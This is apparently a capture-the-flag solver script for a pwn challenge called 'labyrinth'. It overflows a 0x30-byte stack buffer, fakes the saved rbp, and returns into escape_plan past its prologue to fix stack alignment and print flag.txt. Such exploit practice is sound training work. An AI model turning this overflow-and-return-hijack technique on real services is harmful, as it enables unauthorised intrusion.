#!/usr/bin/env python3
"""labyrinth: main reads a door choice with fgets, then reads 0x44 bytes into a 0x30-byte
buffer on the stack. No canary, no PIE, so the saved rbp is at buf+0x30 and the return
address at buf+0x38. The return target is escape_plan, which opens ./flag.txt and prints it.

Entering escape_plan at its first byte leaves rsp 8 bytes off 16-byte alignment, so the
fprintf call crashes in glibc. Jumping to 0x401259 (after push rbp / mov rbp, rsp) fixes
the alignment. escape_plan then uses rbp for its locals, so the saved rbp is set to a
writable address in the .bss page.
"""
import socket
import struct
import sys

ESCAPE_PLAN_BODY = 0x401259  # escape_plan+4: `sub rsp, 0x10`, skips push rbp / mov rbp, rsp
FAKE_RBP = 0x404800  # writable, same page as .bss, used for escape_plan's locals
BUF_TO_RBP = 0x30  # buf at rbp-0x30, saved rbp at rbp+0, return address at rbp+8


def solve(host, port):
    # "69" passes the first strncmp in main and opens the overflow path
    door = b"69\n"
    payload = b"A" * BUF_TO_RBP + struct.pack("<Q", FAKE_RBP)
    payload += struct.pack("<Q", ESCAPE_PLAN_BODY) + b"\n"
    assert len(payload) <= 0x44 - 1  # fgets(buf, 0x44) keeps at most 0x43 bytes

    with socket.create_connection((host, port), timeout=30) as s:
        s.sendall(door)
        s.sendall(payload)
        out = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    print(out.decode(errors="replace"))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <ip> <port>")
        sys.exit(1)
    solve(sys.argv[1], int(sys.argv[2]))
